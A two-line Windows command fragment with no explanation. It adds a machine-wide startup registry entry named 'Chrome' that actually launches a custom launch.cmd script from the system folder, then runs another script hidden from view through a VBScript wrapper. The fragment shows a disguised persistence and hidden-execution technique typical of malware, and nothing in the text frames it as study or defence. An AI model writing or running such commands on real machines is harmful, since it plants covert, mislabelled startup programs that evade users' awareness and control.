REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Chrome" /t REG_SZ /d %windir%\system32\launch.cmd /f
wscript.exe invisible.vbs btt.cmd